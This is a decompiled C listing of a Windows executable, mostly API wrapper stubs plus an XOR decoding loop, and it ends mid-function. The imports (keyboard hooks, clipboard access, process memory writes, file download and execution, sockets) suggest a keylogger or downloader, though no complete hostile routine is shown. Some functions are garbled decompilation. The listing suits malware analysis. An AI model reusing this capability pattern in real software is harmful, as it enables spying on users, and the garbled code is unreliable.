// Address range: 0x404403 - 0x404409
int32_t function_404403(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition) {
    // 0x404403
    return RegCreateKeyExA(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition);
}

// Address range: 0x40440b - 0x404411
int32_t function_40440b(int32_t * hKey, char * lpSubKey) {
    // 0x40440b
    return RegDeleteKeyA(hKey, lpSubKey);
}

// Address range: 0x404413 - 0x404419
int32_t function_404413(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult) {
    // 0x404413
    return RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);
}

// Address range: 0x40441b - 0x404421
int32_t function_40441b(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData) {
    // 0x40441b
    return RegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
}

// Address range: 0x404423 - 0x404429
int32_t function_404423(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData) {
    // 0x404423
    return RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}

// Address range: 0x40442b - 0x404431
bool function_40442b(int32_t * hObject) {
    // 0x40442b
    return CloseHandle(hObject);
}

// Address range: 0x404433 - 0x404439
int32_t function_404433(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2) {
    // 0x404433
    return CompareStringA(Locale, dwCmpFlags, lpString1, cchCount1, lpString2, cchCount2);
}

// Address range: 0x40443b - 0x404441
bool function_40443b(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists) {
    // 0x40443b
    return CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
}

// Address range: 0x404443 - 0x404449
int32_t * function_404443(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile) {
    // 0x404443
    return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

// Address range: 0x40444b - 0x404451
int32_t * function_40444b(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId) {
    // 0x40444b
    return CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

// Address range: 0x404453 - 0x404459
bool function_404453(char * lpFileName) {
    // 0x404453
    return DeleteFileA(lpFileName);
}

// Address range: 0x40445b - 0x404461
void function_40445b(int32_t uExitCode) {
    // 0x40445b
    ExitProcess(uExitCode);
}

// Address range: 0x404463 - 0x404469
int32_t * function_404463(int32_t * hModule, char * lpName, char * lpType) {
    // 0x404463
    return FindResourceA(hModule, lpName, lpType);
}

// Address range: 0x40446b - 0x404471
void function_40446b(int32_t * hLibModule, int32_t dwExitCode) {
    // 0x40446b
    FreeLibraryAndExitThread(hLibModule, dwExitCode);
}

// Address range: 0x404473 - 0x404479
int32_t * function_404473(void) {
    // 0x404473
    return GetCurrentProcess();
}

// Address range: 0x40447b - 0x404481
int32_t function_40447b(int32_t * hFile, int32_t * lpFileSizeHigh) {
    // 0x40447b
    return GetFileSize(hFile, lpFileSizeHigh);
}

// Address range: 0x404483 - 0x404489
int32_t function_404483(int32_t * hModule, char * lpFilename, int32_t nSize) {
    // 0x404483
    return GetModuleFileNameA(hModule, lpFilename, nSize);
}

// Address range: 0x40448b - 0x404491
int32_t * function_40448b(char * lpModuleName) {
    // 0x40448b
    return GetModuleHandleA(lpModuleName);
}

// Address range: 0x404493 - 0x404499
int32_t (*function_404493(int32_t * hModule, char * lpProcName))() {
    // 0x404493
    return GetProcAddress(hModule, lpProcName);
}

// Address range: 0x40449b - 0x4044a1
int32_t function_40449b(int32_t nBufferLength, char * lpBuffer) {
    // 0x40449b
    return GetTempPathA(nBufferLength, lpBuffer);
}

// Address range: 0x4044a3 - 0x4044a9
int32_t function_4044a3(void) {
    // 0x4044a3
    return GetTickCount();
}

// Address range: 0x4044ab - 0x4044b1
int32_t * function_4044ab(int32_t uFlags, int32_t dwBytes) {
    // 0x4044ab
    return GlobalAlloc(uFlags, dwBytes);
}

// Address range: 0x4044b3 - 0x4044b9
int32_t * function_4044b3(int32_t * hMem) {
    // 0x4044b3
    return GlobalFree(hMem);
}

// Address range: 0x4044bb - 0x4044c1
int32_t * function_4044bb(int32_t * hMem) {
    // 0x4044bb
    return GlobalLock(hMem);
}

// Address range: 0x4044c3 - 0x4044c9
bool function_4044c3(int32_t * hMem) {
    // 0x4044c3
    return GlobalUnlock(hMem);
}

// Address range: 0x4044cb - 0x4044d1
int32_t * function_4044cb(char * lpLibFileName) {
    // 0x4044cb
    return LoadLibraryA(lpLibFileName);
}

// Address range: 0x4044d3 - 0x4044d9
bool function_4044d3(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped) {
    // 0x4044d3
    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

// Address range: 0x4044db - 0x4044e1
bool function_4044db(int32_t * hFile) {
    // 0x4044db
    return SetEndOfFile(hFile);
}

// Address range: 0x4044e3 - 0x4044e9
void function_4044e3(int32_t dwMilliseconds) {
    // 0x4044e3
    Sleep(dwMilliseconds);
}

// Address range: 0x4044eb - 0x4044f1
bool function_4044eb(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect) {
    // 0x4044eb
    return VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

// Address range: 0x4044f3 - 0x4044f9
bool function_4044f3(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped) {
    // 0x4044f3
    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

// Address range: 0x4044fb - 0x404501
bool function_4044fb(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten) {
    // 0x4044fb
    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

// Address range: 0x404503 - 0x404509
int32_t function_404503(char * lpString1, char * lpString2) {
    // 0x404503
    return lstrcmpiA(lpString1, lpString2);
}

// Address range: 0x40450b - 0x404511
char * function_40450b(char * lpString1, char * lpString2) {
    // 0x40450b
    return lstrcpyA(lpString1, lpString2);
}

// Address range: 0x404513 - 0x404519
bool function_404513(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer) {
    // 0x404513
    return GetCharWidthA(hdc, iFirst, iLast, lpBuffer);
}

// Address range: 0x40451b - 0x404521
int32_t * function_40451b(int32_t i) {
    // 0x40451b
    return GetStockObject(i);
}

// Address range: 0x404523 - 0x404529
int32_t * function_404523(int32_t * hdc, int32_t * h) {
    // 0x404523
    return SelectObject(hdc, h);
}

// Address range: 0x40452b - 0x404531
int32_t function_40452b(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x40452b
    return CallNextHookEx(hhk, nCode, wParam, lParam);
}

// Address range: 0x404533 - 0x404539
bool function_404533(void) {
    // 0x404533
    return CloseClipboard();
}

// Address range: 0x40453b - 0x404541
int32_t function_40453b(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x40453b
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x404543 - 0x404549
int32_t function_404543(struct tagMSG * lpMsg) {
    // 0x404543
    return DispatchMessageA(lpMsg);
}

// Address range: 0x40454b - 0x404551
bool function_40454b(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam) {
    // 0x40454b
    return EnumWindows(lpEnumFunc, lParam);
}

// Address range: 0x404553 - 0x404559
int32_t * function_404553(char * lpClassName, char * lpWindowName) {
    // 0x404553
    return FindWindowA(lpClassName, lpWindowName);
}

// Address range: 0x40455b - 0x404561
int32_t * function_40455b(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow) {
    // 0x40455b
    return FindWindowExA(hWndParent, hWndChildAfter, lpszClass, lpszWindow);
}

// Address range: 0x404563 - 0x404569
bool function_404563(struct tagPOINT * lpPoint) {
    // 0x404563
    return GetCaretPos(lpPoint);
}

// Address range: 0x40456b - 0x404571
int32_t function_40456b(int32_t * hWnd, int32_t nIndex) {
    // 0x40456b
    return GetClassLongA(hWnd, nIndex);
}

// Address range: 0x404573 - 0x404579
int32_t function_404573(int32_t * hWnd, char * lpClassName, int32_t nMaxCount) {
    // 0x404573
    return GetClassNameA(hWnd, lpClassName, nMaxCount);
}

// Address range: 0x40457b - 0x404581
int32_t * function_40457b(int32_t uFormat) {
    // 0x40457b
    return GetClipboardData(uFormat);
}

// Address range: 0x404583 - 0x404589
int32_t * function_404583(int32_t * hWnd) {
    // 0x404583
    return GetDC(hWnd);
}

// Address range: 0x40458b - 0x404591
bool function_40458b(char * lpKeyState) {
    // 0x40458b
    return GetKeyboardState(lpKeyState);
}

// Address range: 0x404593 - 0x404599
bool function_404593(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax) {
    // 0x404593
    return GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

// Address range: 0x40459b - 0x4045a1
int32_t * function_40459b(int32_t * hWnd) {
    // 0x40459b
    return GetParent(hWnd);
}

// Address range: 0x4045a3 - 0x4045a9
int32_t * function_4045a3(int32_t * hWnd) {
    // 0x4045a3
    return GetTopWindow(hWnd);
}

// Address range: 0x4045ab - 0x4045b1
int32_t * function_4045ab(int32_t * hWnd, int32_t uCmd) {
    // 0x4045ab
    return GetWindow(hWnd, uCmd);
}

// Address range: 0x4045b3 - 0x4045b9
int32_t function_4045b3(int32_t * hWnd, int32_t nIndex) {
    // 0x4045b3
    return GetWindowLongA(hWnd, nIndex);
}

// Address range: 0x4045bb - 0x4045c1
int32_t function_4045bb(int32_t * hWnd, int32_t * lpdwProcessId) {
    // 0x4045bb
    return GetWindowThreadProcessId(hWnd, lpdwProcessId);
}

// Address range: 0x4045c3 - 0x4045c9
bool function_4045c3(int32_t * hWnd) {
    // 0x4045c3
    return IsWindow(hWnd);
}

// Address range: 0x4045cb - 0x4045d1
bool function_4045cb(int32_t * hWnd) {
    // 0x4045cb
    return IsWindowVisible(hWnd);
}

// Address range: 0x4045d3 - 0x4045d9
bool function_4045d3(int32_t * hWnd, int32_t uIDEvent) {
    // 0x4045d3
    return KillTimer(hWnd, uIDEvent);
}

// Address range: 0x4045db - 0x4045e1
int32_t * function_4045db(int32_t * hInstance, char * lpIconName) {
    // 0x4045db
    return LoadIconA(hInstance, lpIconName);
}

// Address range: 0x4045e3 - 0x4045e9
bool function_4045e3(int32_t * hWndNewOwner) {
    // 0x4045e3
    return OpenClipboard(hWndNewOwner);
}

// Address range: 0x4045eb - 0x4045f1
bool function_4045eb(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x4045eb
    return PostMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x4045f3 - 0x4045f9
void function_4045f3(int32_t nExitCode) {
    // 0x4045f3
    PostQuitMessage(nExitCode);
}

// Address range: 0x4045fb - 0x404601
int32_t function_4045fb(int32_t * hWnd, int32_t * hDC) {
    // 0x4045fb
    return ReleaseDC(hWnd, hDC);
}

// Address range: 0x404603 - 0x404609
int32_t function_404603(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x404603
    return SendMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x40460b - 0x404611
int32_t function_40460b(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t)) {
    // 0x40460b
    return SetTimer(hWnd, nIDEvent, uElapse, lpTimerFunc);
}

// Address range: 0x404613 - 0x404619
int32_t function_404613(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong) {
    // 0x404613
    return SetWindowLongA(hWnd, nIndex, dwNewLong);
}

// Address range: 0x40461b - 0x404621
int32_t * function_40461b(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId) {
    // 0x40461b
    return SetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
}

// Address range: 0x404623 - 0x404629
int32_t function_404623(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags) {
    // 0x404623
    return ToAscii(uVirtKey, uScanCode, lpKeyState, lpChar, uFlags);
}

// Address range: 0x40462b - 0x404631
bool function_40462b(int32_t * hhk) {
    // 0x40462b
    return UnhookWindowsHookEx(hhk);
}

// Address range: 0x404633 - 0x40463a
int32_t function_404633(void) {
    // 0x404633
    return function_402643();
}

// Address range: 0x40463b - 0x404641
int32_t * function_40463b(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam) {
    // 0x40463b
    return CreateWindowExA(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
}

// Address range: 0x404643 - 0x40469a
int32_t function_404643(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle) {
    // 0x404643
    int32_t v1; // 0x404643
    int32_t v2; // 0x404643
    int32_t v3; // 0x404643
    int32_t v4; // 0x404643
    int32_t hMenu; // 0x404643
    function_4026bb(v3, hMenu, v4, v2, v1);
    int32_t hInstance; // 0x404643
    int32_t lpParam; // 0x404643
    int32_t * windowHandle = CreateWindowExA(dwExStyle, (char *)lpClassName, (char *)lpWindowName, dwStyle, X, Y, nWidth, nHeight, (int32_t *)hWndParent, (int32_t *)hMenu, (int32_t *)hInstance, (int32_t *)lpParam); // 0x404682
    function_4026ab();
    return (int32_t)windowHandle;
}

// Address range: 0x40469b - 0x4046c0
int32_t function_40469b(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4046a6
    __writefsdword(0, (int32_t)&v1);
    g87++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4046c0 - 0x4046c5
int32_t function_4046c0(void) {
    // 0x4046c0
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4046c5 - 0x4046c7
int32_t function_4046c5(void) {
    // 0x4046c5
    int32_t result; // 0x4046c5
    return result;
}

// Address range: 0x4046c7 - 0x4046c9
int32_t function_4046c7(int32_t a1) {
    // 0x4046c7
    int32_t result; // 0x4046c7
    return result;
}

// Address range: 0x4046cb - 0x4046d3
int32_t function_4046cb(void) {
    // 0x4046cb
    g87--;
    int32_t result; // 0x4046cb
    return result;
}

// Address range: 0x4046d6 - 0x404748
int32_t function_4046d6(void) {
    // 0x4046d6
    int32_t v1; // 0x4046d6
    *(int32_t *)v1 = v1 - 1;
    int32_t v2; // 0x4046d6
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    uint32_t v4; // 0x4046d6
    char * v5 = (char *)(v4 + 101); // 0x4046da
    char v6 = v4 / 256; // 0x4046da
    *v5 = *v5 + v6;
    int32_t v7 = 0x6c6c642e * *(int32_t *)(v1 + 101); // 0x4046df
    *(char *)v2 = *(char *)&v2 + v6;
    int32_t v8 = v2;
    *(char *)v8 = *(char *)&v2 + (char)v8;
    int32_t v9 = v2;
    *(char *)v9 = *(char *)&v2 + (char)v9;
    int32_t v10 = v2;
    *(char *)v10 = *(char *)&v2 + (char)v10;
    int32_t v11; // 0x4046d6
    char * v12 = (char *)(v11 - 117); // 0x4046ee
    *v12 = *v12 + (char)v4;
    __asm_in((int16_t)v4);
    *(int32_t *)(v7 - 8) = 0x404748;
    int32_t v13 = __readfsdword(0); // 0x4046fa
    int32_t v14 = v7 - 12; // 0x4046fa
    int32_t * v15 = (int32_t *)v14; // 0x4046fa
    *v15 = v13;
    __writefsdword(0, v14);
    int32_t v16 = g88 + 1; // 0x404700
    g88 = v16;
    if (v16 == 0) {
        // 0x404708
        function_4033f7();
        function_4033f7();
        function_4033f7();
        function_4033f7();
        function_4033f7();
    }
    // 0x40473a
    __writefsdword(0, *v15);
    *(int32_t *)(v7 - 4) = 0x40474f;
    return 0;
}

// Address range: 0x404748 - 0x40474d
int32_t function_404748(void) {
    // 0x404748
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40474d - 0x40474f
int32_t function_40474d(void) {
    // 0x40474d
    int32_t result; // 0x40474d
    return result;
}

// Address range: 0x40474f - 0x404751
int32_t function_40474f(int32_t a1) {
    // 0x40474f
    int32_t result; // 0x40474f
    return result;
}

// Address range: 0x404753 - 0x40475b
int32_t function_404753(void) {
    // 0x404753
    g88--;
    int32_t result; // 0x404753
    return result;
}

// Address range: 0x40475b - 0x404794
int32_t function_40475b(void) {
    int32_t v1 = function_4037a7(); // 0x404762
    int32_t result = function_40354f(); // 0x40476d
    int32_t result2 = result; // 0x404774
    int32_t v2 = 0; // 0x404774
    if (result < 1) {
        // 0x404790
        return result;
    }
    int32_t v3 = v1; // 0x404774
    char * v4 = (char *)v3; // 0x40477c
    *v4 = *v4 ^ *(char *)(v2 + (int32_t)&g26);
    int32_t v5 = v2 + 1 & -0x7ffffff9; // 0x404780
    v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
    result2--;
    v3++;
    while (result2 != 0) {
        // 0x404776
        v4 = (char *)v3;
        *v4 = *v4 ^ *(char *)(v2 + (int32_t)&g26);
        v5 = v2 + 1 & -0x7ffffff9;
        v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
        result2--;
        v3++;
    }
    // 0x404790
    return result2;
}

// Address range: 0x404797 - 0x4047bc
int32_t function_404797(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4047a2
    __writefsdword(0, (int32_t)&v1);
    g89++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4047bc - 0x4047c1
int32_t function_4047bc(void) {
    // 0x4047bc
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4047c1 - 0x4047c3
int32_t function_4047c1(void) {
    // 0x4047c1
    int32_t result; // 0x4047c1
    return result;
}

// Address range: 0x4047c3 - 0x4047c5
int32_t function_4047c3(int32_t a1) {
    // 0x4047c3
    int32_t result; // 0x4047c3
    return result;
}

// Address range: 0x4047c7 - 0x4047cf
int32_t function_4047c7(void) {
    // 0x4047c7
    g89--;
    int32_t result; // 0x4047c7
    return result;
}

// Address range: 0x4047cf - 0x4047f4
int32_t function_4047cf(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4047da
    __writefsdword(0, (int32_t)&v1);
    g90++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4047f4 - 0x4047f9
int32_t function_4047f4(void) {
    // 0x4047f4
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4047f9 - 0x4047fb
int32_t function_4047f9(void) {
    // 0x4047f9
    int32_t result; // 0x4047f9
    return result;
}

// Address range: 0x4047fb - 0x4047fd
int32_t function_4047fb(int32_t a1) {
    // 0x4047fb
    int32_t result; // 0x4047fb
    return result;
}

// Address range: 0x4047ff - 0x404807
int32_t function_4047ff(void) {
    // 0x4047ff
    g90--;
    int32_t result; // 0x4047ff
    return result;
}

// Address range: 0x404807 - 0x40480d
int32_t function_404807(int32_t s) {
    // 0x404807
    return closesocket(s);
}

// Address range: 0x40480f - 0x404815
int32_t function_40480f(int32_t s, struct sockaddr * name, int32_t namelen) {
    // 0x40480f
    return connect(s, name, namelen);
}

// Address range: 0x404817 - 0x40481d
int16_t function_404817(int16_t hostshort) {
    // 0x404817
    return htons(hostshort);
}

// Address range: 0x40481f - 0x404825
char * function_40481f(struct in_addr in) {
    // 0x40481f
    return inet_ntoa(in);
}

// Address range: 0x404827 - 0x40482d
int32_t function_404827(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x404827
    return recv(s, buf, len, flags);
}

// Address range: 0x40482f - 0x404835
int32_t function_40482f(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x40482f
    return send(s, buf, len, flags);
}

// Address range: 0x404837 - 0x40483d
int32_t function_404837(int32_t af, int32_t type, int32_t protocol) {
    // 0x404837
    return socket(af, type, protocol);
}

// Address range: 0x40483f - 0x404845
struct hostent * function_40483f(char * name) {
    // 0x40483f
    return gethostbyname(name);
}

// Address range: 0x404847 - 0x40484d
int32_t function_404847(char * name, int32_t namelen) {
    // 0x404847
    return gethostname(name, namelen);
}

// Address range: 0x40484f - 0x404855
int32_t function_40484f(int16_t wVersionRequested, struct WSAData * lpWSAData) {
    // 0x40484f
    return WSAStartup(wVersionRequested, lpWSAData);
}

// Address range: 0x404857 - 0x40485d
int32_t function_404857(void) {
    // 0x404857
    return WSACleanup();
}

// Address range: 0x40485f - 0x404884
int32_t function_40485f(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40486a
    __writefsdword(0, (int32_t)&v1);
    g91++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404884 - 0x404889
int32_t function_404884(void) {
    // 0x404884
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404889 - 0x40488b
int32_t function_404889(void) {
    // 0x404889
    int32_t result; // 0x404889
    return result;
}

// Address range: 0x40488b - 0x40488d
int32_t function_40488b(int32_t a1) {
    // 0x40488b
    int32_t result; // 0x40488b
    return result;
}

// Address range: 0x40488f - 0x404897
int32_t function_40488f(void) {
    // 0x40488f
    g91--;
    int32_t result; // 0x40488f
    return result;
}

// Address range: 0x404a2f - 0x404a54
int32_t function_404a2f(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404a3a
    __writefsdword(0, (int32_t)&v1);
    g92++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404a54 - 0x404a59
int32_t function_404a54(void) {
    // 0x404a54
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404a59 - 0x404a5b
int32_t function_404a59(void) {
    // 0x404a59
    int32_t result; // 0x404a59
    return result;
}

// Address range: 0x404a5b - 0x404a5d
int32_t function_404a5b(int32_t a1) {
    // 0x404a5b
    int32_t result; // 0x404a5b
    return result;
}

// Address range: 0x404a5f - 0x404a67
int32_t function_404a5f(void) {
    // 0x404a5f
    g92--;
    int32_t result; // 0x404a5f
    return result;
}

// Address range: 0x404a67 - 0x404a8c
int32_t function_404a67(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404a72
    __writefsdword(0, (int32_t)&v1);
    g93++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404a8c - 0x404a91
int32_t function_404a8c(void) {
    // 0x404a8c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404a91 - 0x404a93
int32_t function_404a91(void) {
    // 0x404a91
    int32_t result; // 0x404a91
    return result;
}

// Address range: 0x404a93 - 0x404a95
int32_t function_404a93(int32_t a1) {
    // 0x404a93
    int32_t result; // 0x404a93
    return result;
}

// Address range: 0x404a97 - 0x404a9f
int32_t function_404a97(void) {
    // 0x404a97
    g93--;
    int32_t result; // 0x404a97
    return result;
}

// Address range: 0x404a9f - 0x404aa5
int32_t * function_404a9f(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd) {
    // 0x404a9f
    return ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
}

// Address range: 0x404aa7 - 0x404acc
int32_t function_404aa7(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404ab2
    __writefsdword(0, (int32_t)&v1);
    g94++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404acc - 0x404ad1
int32_t function_404acc(void) {
    // 0x404acc
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404ad1 - 0x404ad3
int32_t function_404ad1(void) {
    // 0x404ad1
    int32_t result; // 0x404ad1
    return result;
}

// Address range: 0x404ad3 - 0x404ad5
int32_t function_404ad3(int32_t a1) {
    // 0x404ad3
    int32_t result; // 0x404ad3
    return result;
}

// Address range: 0x404ad7 - 0x404adf
int32_t function_404ad7(void) {
    // 0x404ad7
    g94--;
    int32_t result; // 0x404ad7
    return result;
}

// Address range: 0x404adf - 0x404b04
int32_t function_404adf(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404aea
    __writefsdword(0, (int32_t)&v1);
    g95++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404b04 - 0x404b09
int32_t function_404b04(void) {
    // 0x404b04
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404b09 - 0x404b0b
int32_t function_404b09(void) {
    // 0x404b09
    int32_t result; // 0x404b09
    return result;
}

// Address range: 0x404b0b - 0x404b0d
int32_t function_404b0b(int32_t a1) {
    // 0x404b0b
    int32_t result; // 0x404b0b
    return result;
}

// Address range: 0x404b0f - 0x404b17
int32_t function_404b0f(void) {
    // 0x404b0f
    g95--;
    int32_t result; // 0x404b0f
    return result;
}

// Address range: 0x404b17 - 0x404b3c
int32_t function_404b17(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404b22
    __writefsdword(0, (int32_t)&v1);
    g96++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404b3c - 0x404b41
int32_t function_404b3c(void) {
    // 0x404b3c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404b41 - 0x404b43
int32_t function_404b41(void) {
    // 0x404b41
    int32_t result; // 0x404b41
    return result;
}

// Address range: 0x404b43 - 0x404b45
int32_t function_404b43(int32_t a1) {
    // 0x404b43
    int32_t result; // 0x404b43
    return result;
}

// Address range: 0x404b47 - 0x404b4f
int32_t function_404b47(void) {
    // 0x404b47
    g96--;
    int32_t result; // 0x404b47
    return result;
}

// Address range: 0x404b4f - 0x404b55
int32_t function_404b4f(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5) {
    // 0x404b4f
    return URLDownloadToFileA(a1, a2, a3, a4, a5);
}

// Address range: 0x404b57 - 0x404b7c
int32_t function_404b57(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404b62
    __writefsdword(0, (int32_t)&v1);
    g97++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404b7c - 0x404b81
int32_t function_404b7c(void) {
    // 0x404b7c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404b81 - 0x404b83
int32_t function_404b81(void) {
    // 0x404b81
    int32_t result; // 0x404b81
    return result;
}

// Address range: 0x404b83 - 0x404b85
int32_t function_404b83(int32_t a1) {
    // 0x404b83
    int32_t result; // 0x404b83
    return result;
}

// Address range: 0x404b87 - 0x404b8f
int32_t function_404b87(void) {
    // 0x404b87
    g97--;
    int32_t result; // 0x404b87
    return result;
}

// Address range: 0x404b8f - 0x404ba5
int32_t function_404b8f(void) {
    // 0x404b8f
    int32_t v1; // 0x404b8f
    int32_t v2 = v1 & 255;
    if ((char)v1 < 10) {
        // 0x404b93
        return v2 + 48;
    }
    // 0x404b9c
    return v2 + 55;
}

// Address range: 0x404ba7 - 0x404ccb
int32_t function_404ba7(void) {
    // 0x404ba7
    function_40373f();
    int32_t v1 = __readfsdword(0); // bp-52, 0x404bd0
    int32_t v2 = &v1; // 0x404bd0
    __writefsdword(0, v2);
    function_4033f7();
    int32_t v3 = function_40354f(); // 0x404be0
    int32_t v4 = v2; // 0x404be9
    int32_t v5; // 0x404ba7
    int32_t v6; // 0x404ba7
    int32_t v7; // 0x404ba7
    int32_t v8; // 0x404ba7
    int32_t v9; // 0x404ba7
    unsigned char v10; // 0x404bf7
    if (v3 >= 1) {
        // 0x404bf4
        v5 = 1;
        v7 = v2;
        v6 = v3;
        while (true) {
          lab_0x404bf4:
            // 0x404bf4
            v8 = v7;
            int32_t v11; // 0x404ba7
            v10 = *(char *)(v11 - 1 + v5);
            if (v10 != 32) {
                if (v10 < 32) {
                    goto lab_0x404c32;
                } else {
                    unsigned char v12 = v10 - 32; // 0x404c20
                    if (v12 < 96) {
                        // branch -> 0x404c30
                    }
                    // 0x404c30
                    if (v12 >= 95) {
                        // 0x404c87
                        function_4034eb();
                        function_403557();
                        v9 = v8;
                        goto lab_0x404ca0;
                    } else {
                        goto lab_0x404c32;
                    }
                }
            } else {
                // 0x404bfe
                function_403557();
                v9 = v8;
                goto lab_0x404ca0;
            }
        }
    }
  lab_0x404ca8:
    // 0x404ca8
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x404cd2;
    function_40341b();
    return function_4033f7();
  lab_0x404c32:
    // 0x404c32
    *(int32_t *)(v8 - 4) = (int32_t)(v10 & 15);
    *(int32_t *)(v8 - 8) = (int32_t)&g1;
    function_404b8f();
    function_4034eb();
    *(int32_t *)(v8 - 12) = 0;
    function_404b8f();
    function_4034eb();
    int32_t v13 = v8 - 16; // 0x404c76
